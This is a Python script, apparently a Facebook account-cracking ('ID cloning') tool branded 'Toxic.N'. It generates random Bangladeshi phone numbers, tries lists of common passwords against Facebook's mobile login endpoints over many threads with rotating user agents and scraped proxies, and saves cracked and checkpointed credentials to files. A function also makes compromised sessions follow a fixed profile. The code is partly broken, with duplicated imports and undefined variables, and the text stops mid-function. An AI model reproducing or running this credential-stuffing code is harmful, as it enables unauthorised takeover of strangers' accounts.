#---------------------[IMPORT]---------------------#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; Toxic World \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Hamii.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python SHAHBAZ.py')
	#-----------------------[DATE CHECKER]-----------------------#
def Jawnx(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :hking = ' 2009'
        elif uid[:9] in ['100000000']       :hking = '~> 2009'
        elif uid[:8] in ['10000000']        :hking = '~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hking = '~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hking = ' 2010'
        elif uid[:6] in ['100001']          :hking = '~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :hking = '~> 2011/2012'
        elif uid[:6] in ['100004']          :hking = '~> 2012/2013'
        elif uid[:6] in ['100005','100006'] :hking = '~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :hking = '~> 2014/2015'
        elif uid[:6] in ['100009']          :hking = '~> 2015'
        elif uid[:5] in ['10001']           :hking = '~> 2015/2016'
        elif uid[:5] in ['10002']           :hking = '~> 2016/2017'
        elif uid[:5] in ['10003']           :hking = '~> 2018/2019'
        elif uid[:5] in ['10004']           :hking = '~> 2019/2020'
        elif uid[:5] in ['10005']           :hking = '~> 2020'
        elif uid[:5] in ['10006','10007','']:hking = '~> 2021'
        elif uid[:5] in ['10008']           :hking = '~> 2022'
        elif uid[:5] in ['10009']           :hking = '~> 2023'
        else:hking=''
    elif len(uid) in [9,10]:
        hking = '~> 2008/2009'
    elif len(uid)==8:
        hking = '~> 2007/2008'
    elif len(uid)==7:
        hking = '~> 2006/2007'
    else:hking=''
    return hking
    #-----------------------[LOOP]-----------------------#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
syed =[
'Mozilla/5.0 (Linux; Android 12; 2203129G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KH lTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.34.106'
'Mozilla/5.0 (Linux; Android 11; RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/329.0.0.12.106',
'Mozilla/5.0 (Linux; Android 11; RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214',
'Mozilla/5.0 (Linux; Android 12; RMX3491 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104',
'Mozilla/5.0 (Linux; Android 12; RMX3491 Build/RKQ1.211119.001; wv) AppleWebKit/537.36',
'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/308.0.0.10.108',
'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104',
'Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;',
'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; Redmi 6A Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; en-US; Redmi K30 5G Speed Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 8 Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36',

'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A137F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36',
]
logo=("""
\x1b[97;1m   ████████  ██████  ██   ██ ██  ██████    ███    ██ 
\x1b[97;1m      ██    ██    ██  ██ ██  ██ ██         ████   ██ 
\x1b[97;1m      ██    ██    ██   ███   ██ ██         ██ ██  ██ 
\x1b[97;1m      ██    ██    ██  ██ ██  ██ ██         ██  ██ ██ 
\x1b[97;1m      ██     ██████  ██   ██ ██  ██████ \033[38;5;196m██ \x1b[97;1m██   ████ 

\x1b[97;1m  ╔═══════════════════════════════════════════════════╗
\x1b[97;1m  ║      [\033[38;5;196m+\x1b[97;1m] \x1b[97;1mToxic.N I'd Cloning Tools\x1b[97;1m  [\033[38;5;196m+\x1b[97;1m]           ║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╣
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mName     : \x1b[97;1mToxic.N I'd Cloning Tools          \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mGithub   : \x1b[97;1mhttps://github.com/Toxic-N-404     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mWhatsapp : \x1b[97;1m+88016********                     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mVersion  : \x1b[97;1m1.1  	                      \x1b[97;1m║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╝""")
def linex():
	print('  \033[0m╠═══════════════════════════════════════════════════')
loop = 0
oks = []
cps = []
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
    else:
        print(f'  \r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
        for i in range(len(game)):
            print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            #created by hbf team(owner) Hamii
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
        print()
    else:
        print(f'  \r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
        for i in range(len(game)):
            print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print()

 

def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
#---------------------[MAIN MENU]---------------------#
def fia():    
			print(logo)
			print('  \x1b[97;1m║ [×]VERSION : \033[38;5;45m 1.1 ')
			print('  \x1b[97;1m║ [×]TOOL TYPE :  \033[38;5;45m FREE')
			linex()
			print('  \x1b[97;1m║ [1] Crack Random Clone\n  \x1b[97;1m║ [2] Follow my page \n  \x1b[97;1m║ [3] Follow my github\n  \x1b[97;1m║ [0] Exit')
			linex()
			xd=input('  \x1b[97;1m║ [*] Choose an option :\033[38;5;45m ')
			if xd in ['4','04']:
				os.system('clear')
				print(logo)
				print('  \x1b[97;1m║ [×]Example :  \033[38;5;46m/sdcard/file name.txt')
				linex()
				file = input('  \x1b[97;1m║ [×]Put file path\033[1;37m: \033[38;5;45m ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print('  \x1b[97;1m║ \033[38;5;196m[×]File location not found ')
					time.sleep(1)
					menu()
				os.system('clear')
				print(logo)
				
				linex()
				print('  \x1b[97;1m║ [1] Method 1 \n  \x1b[97;1m║ [2] Method 2 ')
				linex()
				mthd=input('  \x1b[97;1m║ [•]Choose: \033[38;5;45m ')
				linex()
				plist = []
				try:
					ps_limit = int(input('  \x1b[97;1m║ [√]How many passwords do you want to add ? \033[38;5;45m '))
				except:
					ps_limit =1
				linex()
				
				linex()
				for i in range(ps_limit):
					print('  \x1b[97;1m║ Example: \033[38;5;46m first last, firstlast,first123,First@123')
					plist.append(input(f'  \x1b[97;1m║ Put password {i+1}: \033[38;5;45m '))
				linex()
				print('  \x1b[97;1m║ [1] Enter For Cloning')
				linex()
				cx=input('  \x1b[97;1m║ [×]Choose:\033[38;5;45m ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=90) as crack_submit:
					os.system('clear')
					print(logo)
					total_ids = str(len(fo))
					
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(mmm,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print('   The process has completed')
				print('   Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input('   Press enter to back ')
				os.system('python tox.py')
			elif xd in ['1','01']:
				menu()
			elif xd in ['2','02']:
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100086490642072/');menu()
			elif xd in ['3','03']:
				os.system(f'xdg-open https://github.com/Toxic-N-404/');menu()
			elif xd in ['0','00']:
				exit()
			else:
				exit(' Option not found in menu...')
		
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r  \x1b[97;1m║ [Toxic.N] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			
			session.headers.update({"Host":"p.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			SHAHBAZ=session.cookies.get_dict().keys()
			if "c_user" in SHAHBAZ:
				print('\r\r  \x1b[97;1m║ [Toxic.N-OK] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/Toxic.N-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r  \x1b[97;1m║ [Toxic.N-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Toxic.N-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r  \x1b[97;1m║ [Toxic.N] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua = random.choice(ugen)
			
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			SHAHBAZ=session.cookies.get_dict().keys()
			if "c_user" in SHAHBAZ:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r  \x1b[97;1m║ [Toxic.N-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/Toxic.N-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r  \x1b[97;1m║ [Toxic.N-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Toxic.N-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
def menu():
	os.system('clear')
	print(logo)
	print('  \x1b[97;1m║ [1] Method 1')
	print('  \x1b[97;1m║ [2] Method 2')
	print('  \x1b[97;1m║ [3] Method 3')
	linex()
	opt = input('  \x1b[97;1m║ [√] SELECT OPT:\033[38;5;45m ')
	if opt =='1':
		random_number1()
	elif opt =='2':
		random_number2()
	elif opt =='3':
		random_number3()
	
	else:
		print('\n  \x1b[97;1m║ [!]Choose valid option\033[38;5;45m')
		menu()
#____
def random_number1():
	uid=[]
	os.system('clear')
	print(logo)
	print('  \x1b[97;1m║ \033[38;5;46m[√] EXAMPLE :88017,88019,88018,88016,\033[38;5;196mETC')
	linex()
	kode = input('  \x1b[97;1m║ [+] PUT YOUR SIM CODE : \033[38;5;45m ')
	os.system('clear')
	print(logo)
	limit = int(input('  \x1b[97;1m║ [+]How many numbers do you want to add ?\033[38;5;45m '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('  \x1b[97;1m║ [*] Total Acounts\033[38;5;45m : '+tl)
		print('  \x1b[97;1m║ [+] Ypur Select Code\033[38;5;45m : '+kode)
		print('  \x1b[97;1m║\033[38;5;196m [*] If You No Result Use Flight Mode ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'+88','###@@@','khan123','khan1234','khan###','khan@@@','khan@@@','@@@###','123@@@','123###','6848373','01847448','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you','Sakil@123','Sakil123','Sakil@@@','@#৳%&%৳#@','&%৳৳%&','#@৳%৳#@','@#৳&&&%#','@৳&&৳#@','643%&4#','13@৳4#','14#@54','@24#@3#','@৳৳2%#৳','(1463#%)',]
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"—") 
	print('  \x1b[97;1m║ \033[38;5;46m[✓] Crack process has been completed\x1b[97;1m ')
	print('  \x1b[97;1m║ \033[38;5;46m[?] Ids saved in Toxic.N-ok.txt,Toxic.N-cp.txt')
	print(47*"—") 
	input('   Press Enter To Go Back To Menu')
	fia()
#____
def random_number2():
	uid=[]
	os.system('clear')
	print(logo)
	print('  \x1b[97;1m║ \033[38;5;46m   [√] EXAMPLE :88017,88019,88018,88016,\033[38;5;196mETC')
	linex()
	kode = input('  \x1b[97;1m║ [+]PUT YOUR SIM CODE :\033[38;5;45m ')
	os.system('clear')
	print(logo)
	limit = int(input('  \x1b[97;1m║ [+]How many numbers do you want to add ?\033[38;5;45m '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('  \x1b[97;1m║ [*] Total Acounts\033[38;5;45m : '+tl)
		print('  \x1b[97;1m║ [+] Ypur Select Code\033[38;5;45m : '+kode)
		print('  \x1b[97;1m║ \033[38;5;196m [*] If You No Result Use Flight Mode ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'+88','###@@@','@@@###','123@@@','123###','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you',]
			yaari.submit(fcrack,uid,pwx,tl)
	print('  \x1b[97;1m║ \033[38;5;46m[✓] Crack process has been completed')
	print('  \x1b[97;1m║ \033[38;5;46m[?] Ids saved in Toxic.N-ok.txt,Toxic.N-cp.txt')
	input('   Press Inter To Back Menu')
	fia()
#____________


#_______
def random_number3():
	uid=[]
	os.system('clear')
	print(logo)
	print('  \x1b[97;1m║ \033[38;5;46m[√] EXAMPLE :88017,88019,88018,88016,\033[38;5;196mETC')
	linex()
	kode = input('  \x1b[97;1m║ [+]\x1b[97;1m PUT YOUR SIM CODE :\033[38;5;45m ')
	os.system('clear')
	print(logo)
	limit = int(input('  \x1b[97;1m║ [+]How many numbers do you want to add ?\033[38;5;45m '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('  \x1b[97;1m║ [*] Total Acounts\033[38;5;45m : '+tl)
		print('  \x1b[97;1m║ [+] Ypur Select Code\033[38;5;45m : '+kode)
		print('  \x1b[97;1m║ \033[38;5;196m [*] If You No Result Use Flight Mode ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'+88','###@@@','@@@###','123@@@','123###','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you',]
			yaari.submit(fcrack,uid,pwx,tl)
	print('  \x1b[97;1m║ \033[38;5;46m[✓] Crack process has been completed')
	print('  \x1b[97;1m║ \033[38;5;46m[?] Ids saved in Toxic.N-ok.txt,Toxic.N-cp.txt')
	input('   Press Inter To Back Menu')
	fia()
#___________
def bd():
	number=[]
	os.system('clear')
	print(logo)
	print('  \x1b[97;1m║ \033[38;5;46m [√] EXAMPLE : 88017,88019,88018,88016,\033[38;5;196mETC')
	linex()
	kode = input('  \x1b[97;1m║ [+] PUT YOUR SIM CODE :\033[38;5;45m ')
	os.system('clear')
	print(logo)
	limit = int(input('  \x1b[97;1m║ [+]How many numbers do you want to add ?\033[38;5;45m '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		number.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('  \x1b[97;1m║ [*] Total Acounts \033[38;5;45m: '+tl)
		print('  \x1b[97;1m║ [+] Ypur Select Code \033[38;5;45m: '+kode)
		print('  \x1b[97;1m║ \033[38;5;196m [*] If You No Result Use Flight Mode ')
		linex()
		for guru in uid:
			number = kode+guru
			pwx = [guru,kode+guru,'+88','###@@@','@@@###','123@@@','123###','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you',]
			yaari.submit(fcrack,uid,pwx,tl)
	print('  \x1b[97;1m║ \033[38;5;46m [✓] Crack process has been completed')
	print('  \x1b[97;1m║ \033[38;5;46m [?] Ids saved inToxic.N-ok.txt,Toxic.N-cp.txt')
	input('   Press Inter To Back Menu')
	fia()
#_____
def fcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global ugen
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r  \x1b[97;1m║ [\033[1;97mToxic.N]\033[0m %s|\033[38;5;46mOK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
			"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
